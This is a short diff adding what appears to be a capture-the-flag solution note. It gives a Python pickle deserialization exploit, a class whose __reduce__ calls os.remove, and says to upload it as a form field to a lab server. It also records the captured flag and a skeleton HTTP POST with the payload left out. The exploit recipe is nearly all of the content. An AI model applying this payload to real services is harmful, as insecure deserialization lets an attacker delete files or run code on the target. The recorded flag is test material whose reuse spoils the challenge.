@@ -1,0 +1,7 @@
+# Craft with: class Exploit: def __reduce__(self): return (os.remove, ('decoy.txt',)). Serialize with pickle.dump(). Upload as multipart/form-data field 'pickle_file'. Flag returned: flag{f96e0e03-a965-4c0d-a9dd-dccb9dfcb22c}
+
+POST / HTTP/1.1
+Host: 172.17.0.1:43981
+Content-Length: 37
+
+[binary pickle payload — see notes]
